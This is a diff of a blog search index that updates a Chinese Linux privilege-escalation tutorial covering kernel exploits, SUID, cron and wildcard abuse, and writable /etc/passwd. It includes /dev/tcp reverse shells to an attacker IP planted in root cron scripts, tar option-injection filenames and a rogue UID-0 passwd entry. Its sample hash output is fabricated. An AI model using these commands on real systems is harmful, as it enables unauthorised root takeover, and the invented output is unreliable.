@@ -5451,17 +5451,77 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
       </tags>
   </entry>
   <entry>
-    <title>Linux 提权小结</title>
-    <url>/2026/07/26/Linux%20%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="Linux-权限说明"><a href="#Linux-权限说明" class="headerlink" title="Linux 权限说明"></a>Linux 权限说明</h2><h3 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h3><ul>
-<li><strong>root（UID 0）</strong> ：超级用户，拥有系统最高权限，绕过绝大多数权限检查。</li>
-<li><strong>系统用户（UID 1–999）</strong> ：为服务进程创建的伪用户，如 <code>www-data</code>、<code>mysql</code>、<code>nobody</code>。</li>
-<li><strong>普通用户（UID ≥ 1000）</strong> ：日常登录用户，权限受 UGO 模型约束。</li>
-</ul>
+    <title>Linux提权小结</title>
+    <url>/2026/07/26/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<blockquote>
+<p>本文仅供安全研究、授权渗透测试、CTF 竞赛与防御教学使用。未经授权对他人系统实施提权攻击属于违法行为。</p>
+</blockquote>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Linux 提权（Privilege Escalation）是渗透测试中的核心环节。攻击者获得初始 foothold 后通常只有低权限 shell（如 <code>www-data</code>、<code>nobody</code>），需要将权限提升到 <strong>root</strong> 才能实现凭据窃取、横向移动和持久化控制。</p>
+<p>本文将 Linux 提权技术分为五大类，按<strong>内核漏洞 → 配置错误 → 特权滥用 → 服务利用 → 环境劫持</strong>的逻辑展开，力求分类清晰、覆盖全面。</p>
+<table>
+<thead>
+<tr>
+<th>分类</th>
+<th>核心思路</th>
+<th>代表技术</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>内核漏洞</td>
+<td>利用内核 CVE 直接改写进程凭证</td>
+<td>DirtyCow、DirtyPipe</td>
+</tr>
+<tr>
+<td>配置错误</td>
+<td>利用管理员配置不当</td>
+<td>SUID滥用、Cron劫持、可写passwd</td>
+</tr>
+<tr>
+<td>特权滥用</td>
+<td>利用已有的 sudo&#x2F;capability 权限</td>
+<td>sudo提权、Capability提权</td>
+</tr>
+<tr>
+<td>服务利用</td>
+<td>利用以 root 运行的服务漏洞</td>
+<td>UDF提权、NFS提权</td>
+</tr>
+<tr>
+<td>环境劫持</td>
+<td>劫持程序运行环境</td>
+<td>PATH劫持、LD_PRELOAD劫持</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="一、Linux-权限体系基础"><a href="#一、Linux-权限体系基础" class="headerlink" title="一、Linux 权限体系基础"></a>一、Linux 权限体系基础</h2><p>理解提权的前提是理解 Linux 的权限模型。Linux 采用 UID&#x2F;GID 体系区分用户身份，通过 UGO（User&#x2F;Group&#x2F;Other）模型控制文件访问。</p>
+<h3 id="1-1-用户角色"><a href="#1-1-用户角色" class="headerlink" title="1.1 用户角色"></a>1.1 用户角色</h3><table>
+<thead>
+<tr>
+<th>角色</th>
+<th>UID</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>root</strong></td>
+<td>0</td>
+<td>超级用户，绕过绝大多数权限检查</td>
+</tr>
+<tr>
+<td><strong>系统用户</strong></td>
+<td>1–999</td>
+<td>服务进程专用账户，如 <code>www-data</code>、<code>mysql</code>、<code>nobody</code></td>
+</tr>
+<tr>
+<td><strong>普通用户</strong></td>
+<td>≥1000</td>
+<td>日常登录用户，受 UGO 模型约束</td>
+</tr>
+</tbody></table>
 <p>每个用户可属于一个主组和若干附加组。<code>id</code> 命令可查看当前用户的 UID、GID 及附加组信息：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">id</span><br>uid=1000(kali) gid=1000(kali) <span class="hljs-built_in">groups</span>=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="hljs-built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),100(<span class="hljs-built_in">users</span>),101(netdev),103(scanner),107(bluetooth),120(lpadmin),129(wireshark),130(kaboxer)<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">id</span><br>uid=1000(kali) gid=1000(kali) <span class="hljs-built_in">groups</span>=1000(kali),4(adm),20(dialout),24(cdrom),27(<span class="hljs-built_in">sudo</span>)...<br></code></pre></td></tr></table></figure>
 
-<h3 id="文件基础权限"><a href="#文件基础权限" class="headerlink" title="文件基础权限"></a>文件基础权限</h3><p>每个文件有三组权限位，分别对应属主（owner）、属组（group）、其他用户（other）：</p>
+<h3 id="1-2-文件基础权限"><a href="#1-2-文件基础权限" class="headerlink" title="1.2 文件基础权限"></a>1.2 文件基础权限</h3><p>每个文件有三组权限位，分别对应属主（owner）、属组（group）、其他用户（other）：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -l /etc/passwd<br>-rw-r--r-- 1 root root 3253 Dec  2  2025 /etc/passwd<br></code></pre></td></tr></table></figure>
 
 <table>
@@ -5473,7 +5533,7 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
 </thead>
 <tbody><tr>
 <td>第 1 位</td>
-<td>文件类型（<code>-</code>普通文件，<code>d</code>目录，<code>l</code>符号链接）</td>
+<td>文件类型（<code>-</code> 普通文件，<code>d</code> 目录，<code>l</code> 符号链接）</td>
 </tr>
 <tr>
 <td>第 2-4 位</td>
@@ -5493,8 +5553,8 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
 <li><code>w</code>：写权限。对文件表示可修改内容，对目录表示可增删其中的文件。</li>
 <li><code>x</code>：执行权限。对文件表示可执行，对目录表示可进入（<code>cd</code>）。</li>
 </ul>
-<p>权限也可用八进制表示，例如 <code>rwxr-xr-x</code> = <code>755</code>，<code>rw-r--r--</code> = <code>644</code>。</p>
-<h3 id="特殊权限位"><a href="#特殊权限位" class="headerlink" title="特殊权限位"></a>特殊权限位</h3><p>除 rwx 外，Linux 还有三种特殊权限位：</p>
+<p>权限也可用八进制表示，例如 <code>rwxr-xr-x</code> &#x3D; <code>755</code>，<code>rw-r--r--</code> &#x3D; <code>644</code>。</p>
+<h3 id="1-3-特殊权限位"><a href="#1-3-特殊权限位" class="headerlink" title="1.3 特殊权限位"></a>1.3 特殊权限位</h3><p>除 rwx 外，Linux 还有三种特殊权限位：</p>
 <table>
 <thead>
 <tr>
@@ -5508,23 +5568,23 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
 <tbody><tr>
 <td><strong>SUID</strong></td>
 <td>可执行文件</td>
-<td><code>s</code>在属主 x 位</td>
+<td><code>s</code> 在属主 x 位</td>
 <td>4000</td>
 <td>执行时以文件属主身份运行</td>
 </tr>
 <tr>
 <td><strong>SGID</strong></td>
 <td>可执行文件&#x2F;目录</td>
-<td><code>s</code>在属组 x 位</td>
+<td><code>s</code> 在属组 x 位</td>
 <td>2000</td>
 <td>执行时以属组身份运行；对目录则使新文件继承目录属组</td>
 </tr>
 <tr>
 <td><strong>SBIT</strong></td>
 <td>目录</td>
-<td><code>t</code>在其他用户 x 位</td>
+<td><code>t</code> 在其他用户 x 位</td>
 <td>1000</td>
-<td>目录内文件仅文件属主和 root 可删除（如<code>/tmp</code>）</td>
+<td>目录内文件仅文件属主和 root 可删除（如 <code>/tmp</code>）</td>
 </tr>
 </tbody></table>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -l /usr/bin/passwd<br>-rwsr-xr-x 1 root root 114072 Sep 16  2025 /usr/bin/passwd<br></code></pre></td></tr></table></figure>
@@ -5533,96 +5593,118 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -ld /tmp<br>drwxrwxrwt 14 root root 340 Jul 19 07:21 /tmp<br></code></pre></td></tr></table></figure>
 
 <p><code>/tmp</code> 的其他用户权限位为 <code>rwt</code>，即设置了 SBIT，保证用户只能删除自己创建的临时文件。</p>
-<h2 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h2><h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>SUID 提权的核心是：<strong>当一个设置了 SUID 位的二进制文件的属主是 root 时，普通用户执行它所得到的进程 EUID 为 root</strong>。如果该二进制本身存在可被利用的功能（如可执行外部命令、可读写任意文件），就能借此获得 root 权限。</p>
-<h3 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>MSF 拿到一个 web 权限的 shell，先用 python 起一个终端方便后续操作</p>
+<h3 id="1-4-提权前置：信息收集"><a href="#1-4-提权前置：信息收集" class="headerlink" title="1.4 提权前置：信息收集"></a>1.4 提权前置：信息收集</h3><p>信息收集决定后续攻击方向。拿到初始 shell 后，通常是一个受限的 tty，先用 Python 升级为完整的交互式终端，避免后续命令执行异常：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p>首先查找拥有 SUID 权限的文件，命令如下（三选一即可，一般用第一个）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure>
-
-<p>查到 find 命令有 SUID 权限，经典的 find 提权，如果有不常见的可以到 <a href="https://gtfobins.org/">GTFOBins</a> 查找</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure>
-
-<h2 id="SUDO-提权"><a href="#SUDO-提权" class="headerlink" title="SUDO 提权"></a>SUDO 提权</h2><h3 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h3><p><code>sudo</code> 允许管理员在 <code>/etc/sudoers</code> 中授权某些用户以特定身份执行特定命令。sudo 需要有一个<strong>普通用户权限的 shell</strong>，因为 web 用户的权限通常较低（如 www-data 用户），且可能缺乏交互式终端或环境完整性。</p>
-<h3 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>首先拿到一个普通用户权限的 shell，<code>sudo -l</code> 命令查看当前用户可用的 sudo 权限</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> -l<br>(ALL, !root) NOPASSWD: /usr/bin/sqlite3<br></code></pre></td></tr></table></figure>
-
-<p>sudo 提权命令还是到 <a href="https://gtfobins.org/">GTFOBins</a> 查找，<code>sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code></p>
-<p>因为禁止以 root 身份执行 <code>/usr/bin/sqlite3</code>，所以需要再配合 <code>CVE-2019-14287</code> 漏洞来提权，使用 <code>sudo -u#-1</code> 指定 root 用户</p>
+<p>随后依次收集系统信息、用户权限、网络配置和计划任务</p>
 <blockquote>
-<p><strong>CVE-2019-14287</strong>：当 sudoers 中出现 <code>RunAs ALL</code> 且用户名以 <code>#</code> 开头时，<code>sudo -u &quot;#-1&quot;</code> 会以 UID 0（root）执行，绕过 root 限制。</p>
+<p>推荐使用 <strong>LinPEAS</strong> 或 <strong>linux-exploit-suggester</strong> 自动化收集，避免遗漏。</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -u#-1 sqlite3 /dev/null <span class="hljs-string">&#x27;.shell /bin/sh&#x27;</span><br></code></pre></td></tr></table></figure>
+<hr>
+<h2 id="二、内核漏洞提权"><a href="#二、内核漏洞提权" class="headerlink" title="二、内核漏洞提权"></a>二、内核漏洞提权</h2><p>利用 Linux 内核自身漏洞直接修改当前进程的凭证结构（<code>struct cred</code>）为 root。这类方法<strong>不依赖用户态配置</strong>，威力大、影响面广，但需要内核版本精确匹配，且通常需要现场编译 Exploit。</p>
+<h3 id="2-1-提权步骤"><a href="#2-1-提权步骤" class="headerlink" title="2.1 提权步骤"></a>2.1 提权步骤</h3><p>首先收集内核版本和发行版信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hostnamectl<br><span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">cat</span> /proc/version<br><span class="hljs-built_in">cat</span> /etc/os-release<br>dmesg | grep <span class="hljs-string">&quot;Linux version&quot;</span><br></code></pre></td></tr></table></figure>
 
-<h2 id="Cron-提权"><a href="#Cron-提权" class="headerlink" title="Cron 提权"></a>Cron 提权</h2><h3 id="提权原理-2"><a href="#提权原理-2" class="headerlink" title="提权原理"></a>提权原理</h3><p><code>cron</code> 是 Linux 的定时任务服务。系统级 cron 任务定义在 <code>/etc/crontab</code>、<code>/etc/cron.d/*</code>、<code>/etc/cron.&#123;hourly,daily,weekly,monthly&#125;/</code> 中，常以 root 身份执行。若任务脚本存在以下问题，即可被利用：</p>
-<ul>
-<li>以 root 身份执行的脚本对低权限用户可写</li>
-<li>脚本中使用通配符展开（如 <code>tar *</code>）</li>
-<li>脚本调用的程序路径可被覆盖</li>
-</ul>
-<h3 id="提权步骤-2"><a href="#提权步骤-2" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>首先反弹 shell 拿到一个 web 用户权限，查看 cron 任务</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">ls</span> -la /etc/cron.d/<br><span class="hljs-built_in">ls</span> -la /etc/cron.&#123;hourly,daily,weekly,monthly&#125;/ 2&gt;/dev/null<br>crontab -l<br>systemctl status cron<br></code></pre></td></tr></table></figure>
+<p>使用 <strong>linux-exploit-suggester</strong> 脚本检测当前内核版本是否存在已知漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 上传脚本并执行</span><br>upload /root/Desktop/linux-exploit-suggester/linux-exploit-suggester.sh /tmp/PrivEsca.sh<br><span class="hljs-built_in">chmod</span> +x /tmp/PrivEsca.sh<br>/tmp/PrivEsca.sh<br></code></pre></td></tr></table></figure>
 
-<p>发现有一个以 root 权限执行的命令，每隔五分钟执行一次</p>
-<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1742536835988-31e2f914-8714-438f-87d2-a1416131e91a-20250323120321-1s7dn4w.png"></p>
-<p>修改该文件，将反弹 shell 命令写入该文件，攻击机开启监听，等待定时任务执行，即可拿到 root 权限的 shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.52.128/5566 0&gt;&amp;1&quot;</span> &gt;&gt;/etc/script/CleaningScript.sh<br></code></pre></td></tr></table></figure>
+<p>脚本输出中黄色标记的条目表示当前内核版本处于该漏洞的影响区间：</p>
+<p><img src="https://s1.eisite.cn/autoupload/41kgv/20260823/folder-mt5t042i-dxtnh39a/assets/network-asset-1742474728608-cd20fb85-52af-44dc-a208-942aa7170c6e-20250323120229-pu6kmks.png"></p>
+<p>根据脚本提供的 Exploit 链接下载对应代码，上传至靶机编译执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">upload /root/Desktop/linux-exploit-suggester/dcow.cpp /tmp/dcow.cpp<br>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil<br><span class="hljs-built_in">chmod</span> +x dcow<br>./dcow<br></code></pre></td></tr></table></figure>
 
-<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><h3 id="提权原理-3"><a href="#提权原理-3" class="headerlink" title="提权原理"></a>提权原理</h3><p>内核提权通过利用 Linux 内核自身漏洞直接将当前进程的凭证结构（<code>struct cred</code>）改写为 root。这类利用<strong>不依赖用户态配置</strong>，威力最大、影响最广，但需要内核版本匹配且通常需要编译 Exploit。</p>
-<h3 id="提权步骤-3"><a href="#提权步骤-3" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>首先需要拿到一个 shell，然后信息收集，获取 Linux 版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">hostnamectl<br>uname -a<br>cat /proc/version<br>cat /etc/os-release<br>dmesg | grep &quot;Linux version&quot;<br></code></pre></td></tr></table></figure>
-
-<p>内核提权检测脚本如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">https://github.com/The-Z-Labs/linux-exploit-suggester<br></code></pre></td></tr></table></figure>
-
-<p>将脚本上传到靶机，给一个执行权限，然后直接使用该脚本检测一下有哪些提权漏洞存在</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">upload /root/Desktop/linux-exploit-suggester/linux-exploit-suggester.sh /tmp/PrivEsca.sh<br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-built_in">chmod</span> +x /tmp/PrivEsca.sh<br>/tmp/PrivEsca.sh<br></code></pre></td></tr></table></figure>
-
-<p>运行脚本后版本是黄色就代表在版本区间，即代表该提权漏洞存在</p>
-<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1742474728608-cd20fb85-52af-44dc-a208-942aa7170c6e-20250323120229-pu6kmks.png"></p>
-<p>然后访问给出的漏洞下载地址下载 EXP，将 EXP 上传编译执行</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">upload /root/Desktop/linux-exploit-suggester/dcow.cpp /tmp/dcow.cpp<br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil<br><span class="hljs-built_in">chmod</span> +x dcow<br>./dcow<br></code></pre></td></tr></table></figure>
-
-<p>执行成功后 root 密码被强制修改为 dirtyCowFun，直接切换 root 用户即可</p>
-<h3 id="经典内核漏洞"><a href="#经典内核漏洞" class="headerlink" title="经典内核漏洞"></a>经典内核漏洞</h3><p><strong>CVE-2016-5195</strong>  <strong>-</strong>  <strong>DirtyCow</strong></p>
-<p>影响 Linux 内核 2.6.22 至 4.8.3，几乎覆盖 2007–2016 年间所有发行版。利用竞态条件使只读内存映射可写，可覆盖 <code>/etc/passwd</code> 或映射 suid 程序代码段注入 shellcode。</p>
+<p>执行成功后 root 密码会被重置为 <code>dirtyCowFun</code>，直接 <code>su root</code> 切换即可。</p>
+<h3 id="2-2-经典内核漏洞"><a href="#2-2-经典内核漏洞" class="headerlink" title="2.2 经典内核漏洞"></a>2.2 经典内核漏洞</h3><p><strong>CVE-2016-5195 — DirtyCow</strong></p>
+<p>影响 Linux 内核 2.6.22 至 4.8.3，几乎覆盖 2007–2016 年间所有主流发行版。利用竞态条件（race condition）使只读内存映射变为可写，进而覆盖 <code>/etc/passwd</code> 或篡改 SUID 程序代码段注入 shellcode。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc dirtycow.c -o dirtycow -lpthread -lcrypt<br>./dirtycow<br></code></pre></td></tr></table></figure>
+
+<p><strong>CVE-2022-0847 — DirtyPipe</strong></p>
+<p>影响 Linux 内核 5.8 至 5.16.10。利用管道缓冲区标志未被正确重置的缺陷，可覆写任意只读文件（包括 <code>/etc/passwd</code>）或覆盖 SUID 二进制代码段。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc dirty_pipe.c -o dirty_pipe<br>./dirty_pipe /etc/passwd 1 <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OVERWRITE_CONTENT&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p><strong>CVE-2026-31431 - Copy Fail</strong></p>
 <p>内核加密子系统的 <code>algif_aead</code> 用户态接口（<code>crypto/algif_aead.c</code>），在处理 <code>recvmsg</code> 拷贝失败时未正确回滚状态，导致内核内存破坏。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 copy_fail_exp.py<br></code></pre></td></tr></table></figure>
 
-<h2 id="其他提权方式"><a href="#其他提权方式" class="headerlink" title="其他提权方式"></a>其他提权方式</h2><h3 id="PATH-提权"><a href="#PATH-提权" class="headerlink" title="PATH 提权"></a>PATH 提权</h3><p><strong>提权原理</strong></p>
-<p>若某个 SUID &#x2F; sudo &#x2F; cron 程序调用了未写绝对路径的命令，攻击者可通过修改 <code>PATH</code> 环境变量让程序优先执行攻击者自定义的恶意版本。</p>
+<blockquote>
+<p>内核 Exploit 可能导致系统崩溃，生产环境需谨慎。务必先确认内核版本、位数和补丁状态。</p>
+</blockquote>
+<hr>
+<h2 id="三、配置错误提权"><a href="#三、配置错误提权" class="headerlink" title="三、配置错误提权"></a>三、配置错误提权</h2><p>配置错误提权不依赖内核漏洞，而是利用管理员配置不当或安全意识缺失。即使系统补丁完善，这类路径依然有效，是实际渗透中最常见的提权方式。</p>
+<h3 id="3-1-SUID-提权"><a href="#3-1-SUID-提权" class="headerlink" title="3.1 SUID 提权"></a>3.1 SUID 提权</h3><p><strong>提权原理</strong></p>
+<p>当一个设置了 SUID 位的二进制文件属主为 root 时，普通用户执行它所得到的进程 EUID 即为 root。若该二进制本身具备可被利用的功能（如可执行外部命令、可读写任意文件），攻击者便可借此获得 root 权限。</p>
 <p><strong>提权步骤</strong></p>
-<p>查找具有 suid 权限的文件，发现一个用户自定义的文件 <code>/opt/statuscheck</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<p>全盘扫描拥有 SUID 权限的文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure>
 
-<p>IDA 中查看或者直接 string 命令找字符串发现该文件调用了 curl 命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">strings /opt/statuscheck<br></code></pre></td></tr></table></figure>
+<p>若发现 <code>find</code> 命令具有 SUID 权限，可直接利用其 <code>-exec</code> 参数执行 shell：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure>
 
-<p>在 tmp 目录下创建 curl 文件，并把它加入到环境变量中，调用的时候就会首先调用环境变量中的 curl（即我们自定义的 curl），然后执行即可获得 root 权限的 shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>&gt; /tmp/curl<br><span class="hljs-built_in">chmod</span> +x /tmp/curl<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <br>/opt/statuscheck<br></code></pre></td></tr></table></figure>
+<p>对于不常见的 SUID 程序，可到 <a href="https://gtfobins.org/">GTFOBins</a> 查询是否存在已知的利用方式。</p>
+<blockquote>
+<p><strong>GTFOBins</strong> 是 Unix&#x2F;Linux 二进制提权速查库，收录了 300+ 个可被滥用的系统程序，按 SUID、sudo、capability 等场景分类检索。</p>
+</blockquote>
+<h3 id="3-2-Cron-定时任务提权"><a href="#3-2-Cron-定时任务提权" class="headerlink" title="3.2 Cron 定时任务提权"></a>3.2 Cron 定时任务提权</h3><p><strong>提权原理</strong></p>
+<p><code>cron</code> 是 Linux 的定时任务服务。系统级 cron 任务定义在 <code>/etc/crontab</code>、<code>/etc/cron.d/*</code>、<code>/etc/cron.&#123;hourly,daily,weekly,monthly&#125;/</code> 中，通常以 root 身份执行。若任务脚本存在以下任一问题，即可被利用：</p>
+<ul>
+<li>以 root 身份执行的脚本对低权限用户可写</li>
+<li>脚本中使用通配符展开（如 <code>tar *</code>）</li>
+<li>脚本调用的程序路径可被覆盖</li>
+</ul>
+<p><strong>提权步骤</strong></p>
+<p>枚举系统中的 cron 任务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">ls</span> -la /etc/cron.d/<br><span class="hljs-built_in">ls</span> -la /etc/cron.&#123;hourly,daily,weekly,monthly&#125;/ 2&gt;/dev/null<br>crontab -l<br>systemctl status cron<br></code></pre></td></tr></table></figure>
 
-<h3 id="NFS-提权"><a href="#NFS-提权" class="headerlink" title="NFS 提权"></a>NFS 提权</h3><p><strong>提权原理</strong></p>
+<p>发现存在一个以 root 权限执行、每隔五分钟运行一次的脚本：</p>
+<p><img src="https://s1.eisite.cn/autoupload/41kgv/20260823/folder-mt5t042i-dxtnh39a/assets/network-asset-1742536835988-31e2f914-8714-438f-87d2-a1416131e91a-20250323120321-1s7dn4w.png"></p>
+<p>该脚本对当前用户可写，将反弹 shell 命令追加到脚本末尾。攻击机开启监听，等待下一次 cron 执行即可获得 root 权限的 shell：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.52.128/5566 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/script/CleaningScript.sh<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-3-通配符注入提权"><a href="#3-3-通配符注入提权" class="headerlink" title="3.3 通配符注入提权"></a>3.3 通配符注入提权</h3><p><strong>提权原理</strong></p>
+<p>当 cron 任务或脚本中使用通配符（如 <code>tar *</code>、<code>rsync *</code>）时，攻击者可创建特殊命名的文件，使其被通配符展开后转化为命令参数，从而注入任意命令。</p>
+<p>以 <code>tar</code> 为例，<code>tar</code> 支持 <code>--checkpoint</code> 和 <code>--checkpoint-action</code> 参数，可指定检查点执行的命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 靶机上的 cron 任务（root 执行）：</span><br><span class="hljs-built_in">cd</span> /home/user/backup &amp;&amp; tar -czf /tmp/backup.tar.gz *<br><br><span class="hljs-comment"># 攻击者操作：</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1&quot;&#x27;</span> &gt; /home/user/backup/shell.sh<br><span class="hljs-built_in">chmod</span> +x /home/user/backup/shell.sh<br><span class="hljs-built_in">touch</span> /home/user/backup/--checkpoint=1<br><span class="hljs-built_in">touch</span> /home/user/backup/--checkpoint-action=<span class="hljs-built_in">exec</span>=shell.sh<br><br><span class="hljs-comment"># 等待 cron 执行 tar 时，通配符展开为：</span><br><span class="hljs-comment"># tar -czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.sh shell.sh</span><br><span class="hljs-comment"># 触发反弹 shell</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其他支持通配符注入的命令：<code>chmod</code>、<code>chown</code>、<code>rsync</code>、<code>zip</code> 等，详见 <a href="https://gtfobins.org/">GTFOBins</a>。</p>
+</blockquote>
+<h3 id="3-4-可写-etc-passwd-提权"><a href="#3-4-可写-etc-passwd-提权" class="headerlink" title="3.4 可写 &#x2F;etc&#x2F;passwd 提权"></a>3.4 可写 &#x2F;etc&#x2F;passwd 提权</h3><p><strong>提权原理</strong></p>
+<p><code>/etc/passwd</code> 在某些配置不当的系统上对普通用户可写。passwd 文件格式为 <code>username:password:UID:GID:info:home:shell</code>，其中密码字段存放哈希值。若该文件可写，直接追加一个 UID 为 0 的用户记录即可获得 root 权限。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检查权限</span><br><span class="hljs-built_in">ls</span> -l /etc/passwd<br><span class="hljs-comment"># 如果是 -rw-rw-r-- 或更宽松则可利用</span><br><br><span class="hljs-comment"># 生成密码哈希</span><br>openssl passwd -1 -salt hack password123<br><span class="hljs-comment"># 输出：$1$hack$BxCnSn8ZJ5e5J5J5J5J5J5</span><br><br><span class="hljs-comment"># 写入 passwd 文件</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;hack:$1$hack$BxCnSn8ZJ5e5J5J5J5J5J5:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd<br><br><span class="hljs-comment"># 切换到新用户</span><br>su hack<br></code></pre></td></tr></table></figure>
+
